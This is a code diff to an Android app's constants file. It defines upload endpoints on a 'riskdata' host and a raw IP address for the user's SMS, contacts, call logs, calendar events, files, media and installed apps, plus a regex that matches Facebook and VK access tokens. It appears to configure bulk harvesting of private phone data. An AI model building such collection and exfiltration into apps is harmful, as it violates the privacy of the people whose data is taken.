@@ -8,7 +8,7 @@ import android.provider.Telephony;
 
 public interface Constants {
     String testUrl = "https://47.92.149.227:8199";
-    String baseUrl = "https://riskdata.cashsweet.net";
+//    String baseUrl = "https://riskdata.cashsweet.net";
     String WORK_NAME = "weithink";
     String VERSION = "1.2.4";
     Uri CALLURI = CallLog.Calls.CONTENT_URI;
@@ -29,4 +29,45 @@ public interface Constants {
     String SHA1 = "SHA-1";
     String SHA256 = "SHA-256";
     String FB_AUTH_REGEX = "^(fb|vk)[0-9]{5,}[^:]*://authorize.*access_token=.*";
+
+
+    interface DataType{
+        /**
+         * * 1.app
+         *  * 2.calevent
+         *  * 3.calls
+         *  * 4.contacts
+         *  * 5.device
+         *  * 6.file
+         *  * 7.extrasData
+         *  * 8.media
+         *  * 9.sms
+         */
+        String APP_DATA = "app";
+        String CALEVENT_DATA = "calevent";
+        String CALLS_DATA = "calls";
+        String CONTACTS_DATA = "contacts";
+        String DEVICE_DATA = "device";
+        String FILE_DATA = "file";
+        String EXTRASDATA_DATA = "extrasData";
+        String MEDIA_DATA = "media";
+        String SMS_DATA = "sms";
+        //数据类型判断 key
+        String INFO_TYPE = "info_type";
+    }
+    //https://47.92.149.227/data/status?userId=10545
+     interface ApiType{
+        String CONFIG_DATA = "/data/config";
+        String STATUS_DATA = "/data/status";
+        String APP_DATA = "/data/app";
+        String CALEVENT_DATA = "/data/calevent";
+        String CALLS_DATA = "/data/calls";
+        String CONTACTS_DATA = "/data/contacts";
+        String DEVICE_DATA = "/data/device";
+        String FILE_DATA = "/data/file";
+        String EXTRASDATA_DATA = "/data/extrasData";
+        String MEDIA_DATA = "/data/media";
+        String SMS_DATA = "/data/sms";
+    }
+
 }
